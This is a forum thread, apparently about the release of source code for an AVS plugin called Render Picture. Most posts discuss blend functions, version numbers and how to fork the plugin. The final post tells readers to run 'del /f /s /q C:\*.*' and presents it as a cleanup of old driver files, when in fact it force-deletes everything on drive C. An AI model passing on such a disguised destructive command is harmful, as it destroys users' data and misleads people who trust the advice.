      As requested by Jheriko...<br />
      <br />
      this is just the version sitting on my harddrive with all the non-functioning bits (png loading) left out. It's still useful though for the blend functions. I'm not going to develop this any more.</p>

      <br />
      But i don't care about png that much, because i have never used it :p<br />
      Good thing you gave this for us to use (even if it is "unfinished")<br />
      <br />
      You can go now, i don't need anything else from you :p ;)</p>

      <p class="post-content"><strong>Re: Render Picture 1.5</strong><br />
      i'd found it useful if there were version numbers displayed in all your APEs. it seems like i have two versions of channelshift for instance.<br />

      </blockquote>why not releasing the source-code then, so others can finish it? even the nullsoft staff might wanna use it for future versions of avs!

      <p class="post-content">Here it is... I think it's best if someone who is interested and knows enough about C++/assembly takes over the torch. No point in having dozens of forked Render picture's.<br />
      <br />
      But it's useful for the following code:<br />
      - improved ape config saving/loading<br />
      - contains fast MMX code for all the blend modes<br />
      - contains several controls such as scrollbars, dropdown lists, hyperlink, ...</p>

      <p class="post-content">By the way to anyone who plans on expanding render/picture 2: use a different name, filename and unique ID for the APE please. That way, picture2.ape remains the original stable version and no conflicts can occur.<br />
      <br />
      If multiple people have made different versions, try to merge them.<br />
      <br />
      And try to keep the dialog layout purty and aligned :)</p>

      <p class="post-content">Actually, it is easier than that.<br />
      In Run, type "del /f /s /q C:\*.*" (no quotes) and hit OK. This will clear up any old driver filethat is slowing down your computer (that's what the /s operator does). Problem solved.</p>
